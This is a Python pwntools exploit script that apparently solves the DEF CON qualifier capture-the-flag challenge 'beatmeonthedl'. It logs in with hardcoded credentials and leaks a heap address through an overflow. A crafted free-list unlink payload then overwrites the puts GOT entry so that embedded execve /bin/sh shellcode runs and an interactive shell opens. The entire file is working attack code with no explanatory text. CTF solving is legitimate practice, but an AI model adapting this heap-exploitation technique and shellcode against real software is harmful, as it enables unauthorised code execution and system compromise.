from pwn import *

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p = process('./beatmeonthedl')
#print pidof(p)
#p = remote('beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me', '6969')
def login():
  p.recvuntil(': ')
  p.sendline("mcfly")
  p.recvuntil(': ')
  p.sendline("awesnap")

def menu():
  p.recvuntil('| ')

def alloc(msg):
  menu()
  p.sendline('1')
  p.recvuntil('> ')
  p.sendline(msg)

def free(num):
  menu()
  p.sendline('3')
  p.recv()
  p.sendline(num)

def write(idx,msg):
  menu()
  p.sendline('4')
  p.recvuntil(': ')
  p.sendline(idx)
  p.recvuntil(': ')
  p.sendline(msg)

def print_all():
  menu()
  p.sendline('2')
  return p.recvuntil("\n\n")

login()

for i in range(8):
  alloc("A")

print "[*] free chunk_1"
free('1')

print "[*] free chunk_3"
free('3')

print "[*] update chunk_0"
write('0','A'*71)

leak = u32(print_all().split('\n')[1])

print "[*] 3rd chunk leaked :", hex(leak)

puts = 0x609958 # puts@got
fd = puts - 0x18
bk = leak + 0x90 # 5th data addr

payload  = "\x48\x31\xF6\xeb\x13"# xor rsi, rsi; jmp 0x18;
payload += "\x90" * 24
payload += shellcode
payload += "\x90" * (64 - len(payload))
payload += p64(fd)
payload += p64(bk)

print "[*] free chunk_6"
free('6')

print "[*] update chunk_5"
write('5', payload)

print "[*] free chunk_7"
free('7')

p.interactive()
